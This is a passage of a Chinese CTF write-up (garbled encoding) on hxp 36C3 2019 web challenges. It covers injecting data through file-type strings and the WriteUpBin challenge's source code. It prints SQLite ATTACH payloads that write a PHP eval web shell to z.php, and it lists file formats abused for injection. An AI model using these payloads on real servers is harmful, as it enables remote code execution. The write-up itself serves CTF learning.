id="è¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS-object-39-39-ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹"><a href="#è¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS-object-39-39-ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹" class="headerlink" title="è¿˜æœ‰ä¸€ä¸ªæ˜¯0xfb0x01å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯QDOS object&#39;&#39;ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹"></a>è¿˜æœ‰ä¸€ä¸ªæ˜¯<code>0xfb0x01</code>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯<code>QDOS object&#39;&#39;</code>ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png" alt></p>
<h6 id="å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹-payload-å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚"><a href="#å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹-payload-å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚" class="headerlink" title="å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹ payload å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚"></a>å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ªpï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹ payload å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚</h6><h6 id="sqliteæ˜¯å¯ä»¥ç”¨-phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite-attachä¸€ä¸ªz-phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚"><a href="#sqliteæ˜¯å¯ä»¥ç”¨-phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite-attachä¸€ä¸ªz-phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚" class="headerlink" title="sqliteæ˜¯å¯ä»¥ç”¨.phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite attachä¸€ä¸ªz.phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚"></a>sqliteæ˜¯å¯ä»¥ç”¨.phpæ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sqlite attachä¸€ä¸ªz.phpçš„æ–¹æ³•æ¥å†™shelläº†ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;insert INTO t.e (d) VALUES (&apos;&lt;?php eval($_POST[a])?&gt;&apos;);/*</span><br></pre></td></tr></table></figure>

<h6 id="è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™-shell"><a href="#è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™-shell" class="headerlink" title="è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™ shell"></a>è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™ shell</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-4.png" alt></p>
<h6 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h6><h6 id="çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„-wp-ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä»-ctftime-ä¸Šå…¬å¼€çš„-wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚"><a href="#çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„-wp-ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä»-ctftime-ä¸Šå…¬å¼€çš„-wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚" class="headerlink" title="çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„ wp ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä» ctftime ä¸Šå…¬å¼€çš„ wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚"></a>çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„ wp ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä» ctftime ä¸Šå…¬å¼€çš„ wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚</h6><h6 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h6><h6 id="0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®"><a href="#0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®" class="headerlink" title="0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®"></a>0xf702æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®‰å…¨å¯æ§çš„æ•°æ®</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-5.png" alt></p>
<h6 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h6><h6 id="åœ¨-jpeg-çš„-EXIF-æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯†-software-çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯†-comment-çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-exiftool-æ¥ä¿®æ”¹å›¾ç‰‡ã€‚"><a href="#åœ¨-jpeg-çš„-EXIF-æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯†-software-çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯†-comment-çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-exiftool-æ¥ä¿®æ”¹å›¾ç‰‡ã€‚" class="headerlink" title="åœ¨ jpeg çš„ EXIF æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯† software çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯† comment çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ exiftool æ¥ä¿®æ”¹å›¾ç‰‡ã€‚"></a>åœ¨ jpeg çš„ EXIF æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯† software çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯† comment çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ exiftool æ¥ä¿®æ”¹å›¾ç‰‡ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=&quot;payload&quot; -software=&quot;payload2&quot; 1.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-6.png" alt></p>
<h6 id><a href="#" class="headerlink" title="#!"></a>#!</h6><h6 id="æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨-çš„æ–‡ä»¶æ¥æ„é€ payload"><a href="#æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨-çš„æ–‡ä»¶æ¥æ„é€ payload" class="headerlink" title="æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨#!/çš„æ–‡ä»¶æ¥æ„é€ payload"></a>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<code>#!/</code>çš„æ–‡ä»¶æ¥æ„é€ payload</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-7.png" alt></p>
<h6 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h6><h6 id="åˆ©ç”¨gunzipç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å"><a href="#åˆ©ç”¨gunzipç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å" class="headerlink" title="åˆ©ç”¨gunzipç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å"></a>åˆ©ç”¨<code>gunzip</code>ç”Ÿæˆçš„gzæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-8.png" alt></p>
<h6 id="å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹"><a href="#å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹" class="headerlink" title="å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹"></a>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹gzæ–‡ä»¶çš„å†…å®¹</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-9.png" alt></p>
<h5 id="0x02-WriteUpBin"><a href="#0x02-WriteUpBin" class="headerlink" title="0x02 WriteUpBin"></a>0x02 WriteUpBin</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: medium</span><br><span class="line"></span><br><span class="line">Solved:13/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 Â· min(1, 10 / (9 + [13 solves]))) = 455 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Finally (again), a minimalistic, open-source social writeup hosting solution.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag-å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨-admin-ç”¨æˆ·çš„ç¬¬ä¸€æ¡-writeup-æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™-admin-ï¼Œè®©-admin-ç»™ä½ ç‚¹èµã€‚"><a href="#ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag-å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨-admin-ç”¨æˆ·çš„ç¬¬ä¸€æ¡-writeup-æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™-admin-ï¼Œè®©-admin-ç»™ä½ ç‚¹èµã€‚" class="headerlink" title="ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨ admin ç”¨æˆ·çš„ç¬¬ä¸€æ¡ writeup æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™ admin ï¼Œè®© admin ç»™ä½ ç‚¹èµã€‚"></a>ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨ admin ç”¨æˆ·çš„ç¬¬ä¸€æ¡ writeup æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™ admin ï¼Œè®© admin ç»™ä½ ç‚¹èµã€‚</h6><h6 id="é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š"><a href="#é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š" class="headerlink" title="é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š"></a>é¡¹ç›®çš„ç»“æ„å¦‚ä¸‹ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ Dockerfile							//Dockeræ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ admin.py								//ä½¿ç”¨seleniumæ¨¡æ‹Ÿadminç™»å½•å¹¶ç‚¹èµ</span><br><span class="line">â”œâ”€â”€ db.sql									//æ•°æ®åº“æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ docker-stuff</span><br><span class="line">â”‚   â”œâ”€â”€ default							//é…ç½®æ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ www.conf						//é…ç½®æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ www</span><br><span class="line">â”‚   â”œâ”€â”€ general.php					//è¿æ¥æ•°æ®åº“è®¾ç½®headerå¤´ç­‰ä¸€äº›åˆå§‹åŒ–æ“ä½œ</span><br><span class="line">â”‚   â”œâ”€â”€ html</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ add.php					//æ·»åŠ writeupç›¸å…³æ“ä½œ</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ admin.php				//æŠŠwriteupæäº¤ç»™admin</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ index.php				//å…¥å£æ–‡ä»¶</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ like.php				//ç‚¹èµæ“ä½œ</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ login_admin.php	//adminç™»é™†æ“ä½œ</span><br><span class="line">â”‚   â”‚   â””â”€â”€ show.php				//è·å–writeupå†…å®¹</span><br><span class="line">â”‚   â””â”€â”€ views</span><br><span class="line">â”‚       â”œâ”€â”€ header.php			//åœ¨é¡µé¢ä¸Šæ–¹å±•ç¤ºç›®å‰idæäº¤çš„writeup</span><br><span class="line">â”‚       â”œâ”€â”€ home.php				//é¡µé¢ä¸­éƒ¨ç”¨æ¥æä¾›ç»™ç”¨æˆ·è¾“å…¥çš„ç•Œé¢</span><br><span class="line">â”‚       â””â”€â”€ show.php				//ç‚¹èµã€æäº¤ç»™adminçš„å±•ç¤ºé¡µé¢</span><br><span class="line">â””â”€â”€ ynetd										//ç”¨æ¥å¯åŠ¨ admin.py</span><br></pre></td></tr></table></figure>

<h6 id="æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show-phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚"><a href="#æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show-phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚" class="headerlink" title="æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show.phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚"></a>æ—¢ç„¶flagåœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹show.phpï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å–writeupçš„å†…å®¹ã€‚</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'../general.php'</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">'SELECT id, content FROM `writeup` WHERE `id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">'s'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="string">'SELECT user_id FROM `like` WHERE `writeup_id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">'s'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'../views/header.php'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'../views/show.php'</span>);</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup-idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag-writeup-idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header-phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup-id"><a href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup-idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag-writeup-idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header-phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup-id" class="headerlink" title="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag writeup idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header.phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup id"></a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°idå¹¶æ²¡æœ‰ä»€ä¹ˆé‰´æƒæªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡writeup idæ¥è·å–writeupå†…å®¹ï¼Œè€Œflag writeup idåœ¨adminç”¨æˆ·æ•°æ®å½“ä¸­ï¼Œè€Œåœ¨header.phpä¸­å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ‰€æœ‰çš„writeup id</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($writeups <span class="keyword">as</span> $w): <span class="meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="string">"/show.php?id=&lt;?= $w['id'] ?&gt;"</span>&gt;Writeup - <span class="meta">&lt;?</span>= $w[<span class="string">'id'</span>] <span class="meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

